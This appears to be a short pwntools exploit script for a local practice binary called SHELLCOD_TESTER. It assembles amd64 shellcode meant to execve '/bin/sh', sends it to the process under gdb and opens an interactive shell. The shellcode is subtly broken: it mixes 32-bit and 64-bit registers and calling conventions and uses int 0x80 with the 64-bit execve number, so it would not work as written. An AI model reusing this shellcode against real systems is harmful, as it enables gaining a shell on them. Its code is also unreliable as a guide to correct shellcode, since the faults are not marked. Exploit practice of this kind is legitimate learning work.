from pwn import *

exe = './SHELLCOD_TESTER'
elf = context.binary = ELF(exe)
# libc = ELF("")

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
    
gdbscript = '''
    continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#reading shellcode 
context.update(arch='amd64', os='linux')
g= asm(
    '''
    xor eax, eax
    xor edx, edx
    xor edi, edi
    xor esi, esi

    push 0x00
    mov edx, 0x0068732f
    mov ebx, 0x6e69622f
    push edx
    push ebx
    
    mov edx, 0
    mov edi, rsp
    mov eax, 0x3b
    int 0x80

    '''
)

p = start()
gdb.attach(p, api=True)

p.sendline(g)

p.interactive()
